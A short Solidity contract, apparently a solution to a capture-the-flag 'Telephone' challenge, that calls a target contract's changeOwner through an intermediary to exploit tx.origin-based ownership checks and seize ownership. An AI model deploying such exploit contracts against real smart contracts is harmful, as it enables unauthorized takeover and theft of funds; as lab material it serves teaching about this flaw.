// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    ITelephone public target;

    constructor(address _target) {
        target = ITelephone(_target);
    }

    function attack() external {
        target.changeOwner(msg.sender);
    }
}
